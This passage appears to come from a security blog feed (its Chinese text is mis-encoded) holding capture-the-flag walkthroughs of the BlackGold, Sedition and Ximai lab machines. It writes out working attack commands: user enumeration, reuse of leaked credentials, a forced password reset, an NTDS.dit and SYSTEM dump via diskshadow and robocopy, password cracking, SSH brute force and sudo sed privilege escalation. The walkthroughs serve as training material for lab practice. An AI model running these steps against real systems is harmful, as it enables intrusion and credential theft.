END_YEAR = 2024  # å®é™…ä¼šæ£€æŸ¥åˆ° 2025 å¹´

# ä¿å­˜ä¸‹è½½æ–‡ä»¶çš„ç›®å½•å
OUTPUT_DIR = "found_pdfs"

# --- ä¸»é€»è¾‘ ---
def fuzz_and_download():
    """
    éå†æŒ‡å®šæ—¥æœŸèŒƒå›´ï¼Œå°è¯•ä¸‹è½½ PDF æ–‡ä»¶ã€‚
    å¦‚æœæœåŠ¡å™¨è¿”å› 200 çŠ¶æ€ç ï¼Œåˆ™å°†æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°ã€‚
    """
    print(f"[*] å¼€å§‹çˆ†ç ´ç›®æ ‡: {BASE_URL}")
    print(f"[*] æ‰¾åˆ°çš„ PDF å°†ä¿å­˜åœ¨ ./{OUTPUT_DIR}/ ç›®å½•ä¸­")

    # 1. å¦‚æœè¾“å‡ºç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºå®ƒ
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)
        print(f"[*] å·²åˆ›å»ºç›®å½•: {OUTPUT_DIR}")

    found_files_count = 0

    # 2. éå†æ‰€æœ‰å¯èƒ½çš„æ—¥æœŸ
    for year in range(START_YEAR, END_YEAR + 1):
        for month in range(1, 13):
            for day in range(1, 32):
                
                # éªŒè¯æ—¥æœŸæ˜¯å¦æœ‰æ•ˆï¼Œè·³è¿‡å¦‚ 2æœˆ30æ—¥ ç­‰
                try:
                    datetime.date(year, month, day)
                except ValueError:
                    continue

                # æ ¼å¼åŒ–æ—¥æœŸå’Œ URL
                date_str = f"{year}-{month:02d}-{day:02d}"
                filename = f"{date_str}.pdf"
                url_path = f"/docs/{filename}"
                full_url = f"{BASE_URL}{url_path}"

                try:
                    # æ‰“å°å•è¡Œè¿›åº¦æ¡ï¼Œend='\r' è®©å…‰æ ‡å›åˆ°è¡Œé¦–ï¼Œå®ç°åŠ¨æ€æ›´æ–°
                    print(f"[*] æ­£åœ¨å°è¯•: {full_url}   ", end='\r')

                    # å‘é€è¯·æ±‚ï¼Œstream=True ç”¨äºä¸‹è½½å¤§æ–‡ä»¶ï¼Œä¸ä¼šä¸€æ¬¡æ€§è¯»å…¥å†…å­˜
                    response = requests.get(full_url, timeout=5, stream=True)

                    # 3. å¦‚æœçŠ¶æ€ç ä¸º 200ï¼Œåˆ™ä¿å­˜æ–‡ä»¶
                    if response.status_code == 200:
                        # æ‰“å°æˆåŠŸä¿¡æ¯ï¼ˆåœ¨æ–°çš„ä¸€è¡Œï¼Œé¿å…è¢«è¿›åº¦æ¡è¦†ç›–ï¼‰
                        print(f"\n[+] æˆåŠŸ! æ‰¾åˆ°æ–‡ä»¶: {full_url} (çŠ¶æ€ç : 200)")
                        
                        # å®šä¹‰æœ¬åœ°ä¿å­˜è·¯å¾„
                        file_path = os.path.join(OUTPUT_DIR, filename)
                        print(f"    -> æ­£åœ¨ä¿å­˜åˆ°: {file_path}...")

                        # ä»¥äºŒè¿›åˆ¶å†™æ¨¡å¼ ('wb') æ‰“å¼€æ–‡ä»¶å¹¶å†™å…¥å†…å®¹
                        with open(file_path, 'wb') as f:
                            for chunk in response.iter_content(chunk_size=8192):
                                f.write(chunk)
                        
                        found_files_count += 1

                except requests.exceptions.RequestException as e:
                    # å¦‚æœå‘ç”Ÿè¿æ¥é”™è¯¯ï¼Œæ‰“å°å‡ºæ¥
                    print(f"\n[!] è¿æ¥é”™è¯¯: {full_url} - {e}")
    
    # 4. ç»“æŸæ—¶æ‰“å°æ€»ç»“
    print("\n\n[*] çˆ†ç ´å®Œæˆã€‚")
    if found_files_count > 0:
        print(f"[*] å…±ä¸‹è½½äº† {found_files_count} ä¸ª PDF æ–‡ä»¶åˆ° '{OUTPUT_DIR}' ç›®å½•ã€‚")
    else:
        print("[*] æœªæ‰¾åˆ°ä»»ä½•å¯ç”¨çš„æ–‡ä»¶ã€‚")

if __name__ == "__main__":
    fuzz_and_download()
```

## ç”¨æˆ·æšä¸¾

å°†ä½œè€… `author` å’Œ `Creator` ä¿¡æ¯æˆªå–å‡ºæ¥

```bash
exiftool PDF/found_pdfs/* | grep -E 'Author|Creator' | grep -v 'Neptune Oil & Gas' | cut -d: -f 2 | sed 's/^ *//' | sort | uniq > users.txt
```

ä½¿ç”¨`kerbrute` æšä¸¾

```bash
âœ  BlackGold kerbrute -users users.txt -domain neptune.thl -dc-ip 192.168.56.10
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Valid user => Lucas.Miller
[*] No passwords were discovered :'(
```

æ‰¾åˆ°ç”¨æˆ·å`Lucas.Miller`

 å†å°è¯•ä¸€ä¸‹å†`PDF`æ–‡ä»¶ä¸­è¯»å–æœ‰å…³`Lucas.Miller` çš„

```bash
âœ  BlackGold pdfgrep -i 'Lucas.Miller' PDF/found_pdfs/*     
PDF/found_pdfs/2023-01-12.pdf:Estimado Lucas Miller,
PDF/found_pdfs/2023-01-12.pdf:   â— Nombre de usuario (Usuario AD): lucas.miller@neptune.thl
```

![image.png](/post-images/TheHackersLabsBlackGold/image5.png)

å¾—åˆ°ä¸€ä¸²å¯†ç  `E@6q%TnR7UEQSXywr8^@`

æµ‹è¯•å‡­æ®æ˜¯å¦æœ‰æ•ˆ

```bash
âœ  BlackGold nxc smb neptune.thl -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.10   445    DC01             [+] neptune.thl\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ 

âœ  BlackGold nxc ldap neptune.thl -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@'
LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
LDAP        192.168.56.10   389    DC01             [+] neptune.thl\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ 
```

## åŸŸåˆ†æ

ä¸Š `BloodHound` åˆ†æä¸€æ³¢

```bash
âœ  BlackGold bloodhound-python -d 'neptune.thl' -ns 192.168.56.10 --zip -c All -dc 'DC01.neptune.thl' -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@' 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: neptune.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.neptune.thl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.neptune.thl
INFO: Found 8 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.neptune.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250715122943_bloodhound.zip
```

`users` ç»„

![image.png](/post-images/TheHackersLabsBlackGold/image6.png)

è§‚å¯Ÿäº†ä¸€ä¸‹ï¼Œç”¨æˆ·`Victor Rodriguez` çš„å¯†ç å†™åœ¨äº†`Description` ä¸Š

![image.png](/post-images/TheHackersLabsBlackGold/image7.png)

å¹¶ä¸”å…¶å±äº`IT`ç»„ï¼Œåœ¨`SMB`ä¸­æœ‰ä¸€ä¸ª`IT`çš„å…±äº«æ–‡ä»¶å¤¹

![image.png](/post-images/TheHackersLabsBlackGold/image8.png)

è¿œç¨‹ç®¡ç†ç»„ç”¨æˆ·æœ‰ä¸¤ä¸ªï¼Œæš‚æ—¶æ˜¯æ¨ªå‘ç›®æ ‡

![image.png](/post-images/TheHackersLabsBlackGold/image9.png)

## æ¨ªå‘ç§»åŠ¨

### To emma.johnson

æµ‹è¯•ä¸Šé¢çš„å‡­æ®

```bash
âœ  BlackGold nxc smb neptune.thl -u 'Victor.Rodriguez' -p 'H5gVCzzZkzJ#wGsT8u1$'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.10   445    DC01             [+] neptune.thl\Victor.Rodriguez:H5gVCzzZkzJ#wGsT8u1$
```

`SMB`é‡Œé¢èƒ½å¾—åˆ°ä¸€ä¸ª`powershell`è„šæœ¬

```bash
âœ  BlackGold smbclient //192.168.56.10/IT -U neptune.thl/Victor.Rodriguez%'H5gVCzzZkzJ#wGsT8u1$'            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 27 08:14:40 2025
  ..                                DHS        0  Fri Feb 28 03:52:00 2025
  Scripts                             D        0  Thu Feb 27 08:16:55 2025

                10540543 blocks of size 4096. 7161242 blocks available
smb: \> cd Scripts\
smb: \Scripts\> ls
  .                                   D        0  Thu Feb 27 08:16:55 2025
  ..                                  D        0  Thu Feb 27 08:14:40 2025
  backup.ps1                          A     1957  Thu Feb 27 08:20:11 2025

                10540543 blocks of size 4096. 7161244 blocks available
smb: \Scripts\> get backup.ps1 
getting file \Scripts\backup.ps1 of size 1957 as backup.ps1 (382.2 KiloBytes/sec) (average 382.2 KiloBytes/sec)
```

æ‰“å¼€åèƒ½å¾—åˆ°ç”¨æˆ·`emma.johnson` çš„å‡­æ®ï¼Œå¯†ç ï¼š`sb9TVndq8N@tUVMmP2@#`

![image.png](/post-images/TheHackersLabsBlackGold/image10.png)

`emma.johnson` æ˜¯æˆ‘ä»¬åœ¨ä¸Šé¢çœ‹åˆ°åœ¨è¿œç¨‹ç®¡ç†ç»„é‡Œé¢çš„ç”¨æˆ·

```bash
âœ  BlackGold nxc winrm neptune.thl -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'
WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\emma.johnson:sb9TVndq8N@tUVMmP2@# (Pwn3d!)
```

![image.png](/post-images/TheHackersLabsBlackGold/image11.png)

è¯¥ç”¨æˆ·èƒ½å¾—åˆ° `user.txt`

```bash
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> type user.txt
a5xxxxxxxxxxxxxxxxxxxxxxxx
```

### To thomas.brown

å½“å‰ç”¨æˆ·æƒé™

![image.png](/post-images/TheHackersLabsBlackGold/image12.png)

ä¸‹ä¸€ä¸ªç”¨æˆ·åŒ…æ˜¯`Thomas Brown` ï¼Œå› ä¸ºä»–å±äº`BACKUP OPERATORS`

![image.png](/post-images/TheHackersLabsBlackGold/image13.png)

é‡æ–°å¯¼å…¥ä¸‹`BloodHound`çš„æ•°æ®

```bash
	bloodhound-python -d 'neptune.thl' -ns 192.168.56.10 --zip -c All -dc 'DC01.neptune.thl' -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'
```

### GPO æ»¥ç”¨ **âŒ**

èƒ½çœ‹åˆ°`emma.johnson` æœ‰æ–°çš„æƒé™

![image.png](/post-images/TheHackersLabsBlackGold/image14.png)

è¯¥ç»„ç­–ç•¥å½±å“å¾ˆå¤šç”¨æˆ·

![image.png](/post-images/TheHackersLabsBlackGold/image15.png)

ä½¿ç”¨`bloodyAD`æ¥å®ç°

èµ‹äºˆ`emma.johnson`è‡ªå·±æ‹¥æœ‰å¯¹è¯¥ `GPO` çš„ `genericAll` æƒé™

```bash
âœ  BlackGold bloodyAD -d 'neptune.thl' --dc-ip 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' add genericAll 'CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL' 'emma.johnson'
[+] emma.johnson has now GenericAll on CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL
```

è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œè¿™é‡Œä½¿ç”¨äº†å¥½å‡ ä¸ªå·¥å…·ä¹Ÿæ— æ³•åˆ©ç”¨

```bash
python3 GPOwned.py -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' -d 'neptune.thl' -dc-ip '192.168.56.10' -gpcmachine -gpoimmtask -name '{037ECEDE-7C98-4D00-95D5-4283F4271B0D}' -author 'neptune.thl\Administrador' -taskname 'Beautiful IOC' -taskdescription 'Hello World' -dstpath 'c:\windows\system32\calc.exe'
```

![image.png](/post-images/TheHackersLabsBlackGold/image16.png)

æœ€åçœ‹äº†`WP`å‘ç°äººå®¶çš„å’Œæˆ‘ä¸ä¸€æ ·

### Force Change PassWord

è¿™é‡Œé‡æ–°å¯¼å…¥äº†ä¸€ä¸‹æœºå™¨ï¼Œç„¶åå†æ¬¡å¯¼å…¥æ–°çš„æ•°æ®ï¼Œå°±å¯ä»¥çœ‹åˆ°`emma.johnson`å¯ä»¥ä¿®æ”¹`thomas`çš„å¯†ç 

![image.png](/post-images/TheHackersLabsBlackGold/image17.png)

é€šè¿‡ `BloodAD`ä¿®æ”¹å¯†ç 

```bash
âœ  BlackGold bloodyAD -d 'neptune.thl' --dc-ip 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' set password thomas.brown Admin@123
[+] Password changed successfully!
```

ç™»å½•`thomas.brown`è´¦æˆ·

![image.png](/post-images/TheHackersLabsBlackGold/image18.png)

### è½¬å‚¨ NTDS

ä¸Šé¢æˆ‘ä»¬å°±çŸ¥é“`thomas.brown` å±äº`BACKUP OPERATORS` ç»„

`whoami`ä¿¡æ¯ä¸­ä¹Ÿèƒ½çœ‹å‡ºæ¥

![image.png](/post-images/TheHackersLabsBlackGold/image19.png)

åˆ©ç”¨ï¼šhttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=backup%20op#using-diskshadowexe

å› ä¸º`winrm`æ˜¯éäº¤äº’ä¼šè¯ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œä¿®æ”¹

```bash
echo "set context persistent nowriters" > C:\Windows\Temp\ntds_shadow.txt
echo "add volume C: alias shadow_c" >> C:\Windows\Temp\ntds_shadow.txt
echo "create" >> C:\Windows\Temp\ntds_shadow.txt
echo "expose %shadow_c% Z:" >> C:\Windows\Temp\ntds_shadow.txt
diskshadow /s C:\Windows\Temp\ntds_shadow.txt
```

```bash
robocopy /B Z:\Windows\NTDS\ C:\rev ntds.dit
robocopy /B Z:\Windows\System32\config\ C:\rev SYSTEM
```

å†é€šè¿‡ `secretdump` è½¬å‚¨å‡ºæ¥

![image.png](/post-images/TheHackersLabsBlackGold/image20.png)

## æ€»ç»“

å¸¸è§„æ€è·¯ï¼Œé™¤äº†æœ‰äº›å‘]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>NTDS</category>
            <category>exiftool</category>
            <category>Domain</category>
            <category>AD</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Sedition]]></title>
            <link>https://www.sunsetaction.top/2025/07/14/TheHackersLabsSedition</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/14/TheHackersLabsSedition</guid>
            <pubDate>Mon, 14 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Sedition https://labs.thehackerslabs.com/machine/117 Recon æ‰«æå‡ºæ¥æ˜¯éå¸¸è§„ç«¯å£ æ²¡æœ‰Webç«¯å£ï¼Œæˆ‘ä»¬åªèƒ½ä»SMBä¸Šæ‰‹ é¦–å…ˆå°è¯•ä½¿ç”¨åŒ¿åè´¦æˆ·è¿›è¡Œè®¿é—® backupé‡Œé¢æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¸‹è½½ ZIP Crack è§£å‹å‹ç¼©åŒ…éœ€è¦å¯†ç  johnè½¬æ¢åçˆ†...]]></description>
            <content:encoded><![CDATA[
# Sedition

> https://labs.thehackerslabs.com/machine/117
> 

![image.png](/post-images/TheHackersLabsSedition/image.png)

## Recon

```bash
âœ  Sedition nmap -sT -min-rate 10000 192.168.56.87      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:30 CST
Nmap scan report for 192.168.56.87
Host is up (0.0037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
```

æ‰«æå‡ºæ¥æ˜¯éå¸¸è§„ç«¯å£

```bash
âœ  Sedition nmap -sT -A -p 139,445 192.168.56.87        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:34 CST
Nmap scan report for 192.168.56.87
Host is up (0.00049s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

Host script results:
|_clock-skew: -3s
| smb2-time: 
|   date: 2025-07-14T13:34:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.56.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
```

æ²¡æœ‰`Web`ç«¯å£ï¼Œæˆ‘ä»¬åªèƒ½ä»`SMB`ä¸Šæ‰‹

é¦–å…ˆå°è¯•ä½¿ç”¨åŒ¿åè´¦æˆ·è¿›è¡Œè®¿é—®

```bash
âœ  Sedition smbclient -L 192.168.56.87 -U anonymous
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      
        IPC$            IPC       IPC Service (Samba Server)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.56.87 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

`backup`é‡Œé¢æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¸‹è½½

![image.png](/post-images/TheHackersLabsSedition/image1.png)

## ZIP Crack

è§£å‹å‹ç¼©åŒ…éœ€è¦å¯†ç 

```bash
âœ  Sedition unzip secretito.zip  
Archive:  secretito.zip
[secretito.zip] password password: 
   skipping: password                incorrect password
```

`john`è½¬æ¢åçˆ†ç ´

```bash
âœ  Sedition zip2john secretito.zip > ziphash.txt                                 
ver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d type=0

âœ  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt         
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sebastian        (secretito.zip/password)     
1g 0:00:00:00 DONE (2025-07-14 21:40) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

è§£å‹åå¾—åˆ°ä¸€ä¸ªå¯†ç  `elbunkermolagollon123`

![image.png](/post-images/TheHackersLabsSedition/image2.png)

è¿™é‡Œå°è¯•äº†å¾ˆå¤šç”¨æˆ·åå°è¯•ç™»å½•`SMB`ï¼Œä½†æ˜¯éƒ½æ˜¯å¤±è´¥äº†

## ç«¯å£æ‰«æ v2

å†æšä¸¾ä¸€ä¸‹ç«¯å£

UDP

```bash
âœ  Sedition nmap -sU -min-rate 5000 192.168.56.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:46 CST
Nmap scan report for 192.168.56.87
Host is up (0.00022s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
137/udp   open   netbios-ns
5353/udp  closed zeroconf
17845/udp closed unknown
25375/udp closed unknown
41702/udp closed unknown
46093/udp closed unknown
51456/udp closed unknown
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
```

TCP æ‰€æœ‰ç«¯å£

```bash
âœ  Sedition nmap -sT -min-rate 10000 -p- 192.168.56.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:48 CST
Nmap scan report for 192.168.56.87
Host is up (0.00037s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65535/tcp open  unknown
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.75 seconds
```

å¤šäº†ä¸ª `65535` ï¼Œæ‰«æä¸€ä¸‹è¯¦ç»†ä¿¡æ¯

```bash
âœ  Sedition nmap -sT -A -p 65535 192.168.56.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:50 CST
Nmap scan report for 192.168.56.87
Host is up (0.00040s latency).

PORT      STATE SERVICE VERSION
65535/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
MAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.56.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```

Ohyaï¼ŸSSHï¼Œ`hydra`çˆ†ç ´ä¸€ä¸‹ç”¨æˆ·å

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  -p elbunkermolagollon123 -t 12 -s 65535 -Vv 192.168.56.87 ssh  
```

å¾—åˆ°ç”¨æˆ·å `cowboy`

![image.png](/post-images/TheHackersLabsSedition/image3.png)

## æƒé™æå‡

### In cowboy shell

æŸ¥çœ‹`sudo`æƒé™

```bash
cowboy@Sedition:~$ sudo -l
[sudo] contraseÃ±a para cowboy: 
Sorry, user cowboy may not run sudo on sedition.
```

å¯»æ‰¾`sid`æƒé™æ–‡ä»¶

```bash
cowboy@Sedition:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
```

çªç„¶æ³¨æ„åˆ°`.bash_history` æ²¡æœ‰è¢«é‡å®šå‘åˆ° `/dev/null`

```bash
cowboy@Sedition:~$ ls -al
total 24
drwx------ 2 cowboy cowboy 4096 jul  6 20:08 .
drwxr-xr-x 4 root   root   4096 jul  6 18:56 ..
-rw------- 1 cowboy cowboy   78 jul 14 16:09 .bash_history
-rw-r--r-- 1 cowboy cowboy  220 jul  6 18:56 .bash_logout
-rw-r--r-- 1 cowboy cowboy 3526 jul  6 18:56 .bashrc
-rw-r--r-- 1 cowboy cowboy  807 jul  6 18:56 .profile
cowboy@Sedition:~$ cat .bash_history 
history
exit
mariadb
mariadb -u cowboy -pelbunkermolagollon123
su debian
exit
```

æ‰’æ‹‰ `users` è¡¨

```bash
MariaDB [bunker]> select * from users;
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
1 row in set (0,000 sec)
```

çˆ†ç ´å¯†ç 

```bash
âœ  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (?)     
1g 0:00:00:00 DONE (2025-07-14 22:17) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

### In debian shell

å½“å‰ç”¨æˆ·å®¶ç›®å½•ä¸‹èƒ½æ‹¿åˆ° `user.txt`

```bash
debian@Sedition:~$ cat flag.txt 
pixxxxxxxxxxxxxxxxxxxxxx
```

`sudo` æƒé™

```bash
debian@Sedition:~$ sudo -l
Matching Defaults entries for debian on sedition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
```

ç»“æŸï¼šhttps://gtfobins.github.io/gtfobins/sed/

![image.png](/post-images/TheHackersLabsSedition/image4.png)

è¯»å– `root.txt`

```bash
# cat root.txt
laxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## æ€»ç»“

è¶…çº§å¸¸è§„]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>SMB</category>
            <category>ZIPcrack</category>
            <category>sed</category>
        </item>
        <item>
            <title><![CDATA[HackMyVM - Ximai]]></title>
            <link>https://www.sunsetaction.top/2025/07/14/HackMyVMXimai</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/14/HackMyVMXimai</guid>
            <pubDate>Mon, 14 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Ximai https://hackmyvm.eu/machines/machine.php?vm=Ximai Notesï¼šMore than one path to initial access. PS: é¶æœºçš„æ–‡ä»¶å¤¹åå­—æ˜¯Ximaiï¼Œä¸æ˜¯Ximiaï¼Œåšçš„æ—¶å€™æ‰“é”™äº†ã€‚ Recon è®¿é—® HTTP ...]]></description>
            <content:encoded><![CDATA[
# Ximai

> https://hackmyvm.eu/machines/machine.php?vm=Ximai
> 

Notesï¼š**More than one path to initial access.**

![image.png](/post-images/HackMyVMXimai/image.png)

PS: é¶æœºçš„æ–‡ä»¶å¤¹åå­—æ˜¯`Ximai`ï¼Œä¸æ˜¯`Ximia`ï¼Œåšçš„æ—¶å€™æ‰“é”™äº†ã€‚

## Recon

```bash
âœ  Ximia nmap -sT -min-rate 10000 192.168.56.62 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:32 CST
Nmap scan report for 192.168.56.62
Host is up (0.0012s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8000/tcp open  http-alt
MAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
```

```bash
âœ  Ximia nmap -sT -A -p 22,80,3306,8000 192.168.56.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:33 CST
Nmap scan report for 192.168.56.62
Host is up (0.0036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
8000/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: NeonGrid Solutions
|_http-open-proxy: Proxy might be redirecting requests
|_http-generator: WordPress 6.8.1
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
